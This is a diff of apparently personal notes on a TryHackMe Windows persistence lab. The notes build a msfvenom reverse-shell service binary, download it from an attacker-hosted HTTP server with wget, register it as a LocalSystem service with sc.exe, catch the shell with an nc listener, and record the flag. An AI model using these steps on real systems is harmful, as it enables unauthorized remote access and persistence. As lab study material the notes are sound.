@@ -122,7 +122,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attack IP] LPORT=[attack port] 
 -attack machine
 python3 -m http.server
 -victim machine
-wget http://[attackIP]:8000/rev-svc.exe
+wget http://[attackIP]:8000/rev-svc.exe-O rev-svc.exe
 -set bin path and service
 sc.exe create THMservice2 binPath= "C:\..\rev-svc.exe" start= auto
 -start listner
@@ -147,8 +147,15 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-se
 -host 
 python3 -m http.server
 -get file on victiim machine - powershell
-wget http://attackerIP:8000/rev-svc.exe
-
+PS C:\Users\Administrator> wget http://attackerIP:8000/rev-svc.exe -O rev-svc.exe
+-set parameters
+sc.exe config THMservice3 binPath= "C:\Users\Administrator\rev-svc.exe" start= auto obj= "LocalSystem"
+-start listener on port 5558 on attack machine
+nc -lvp 5558
+-start service
+sc.exe start THMservice3
+-grab flag
+*THM{IN_PLAIN_SIGHT}
 
 
 
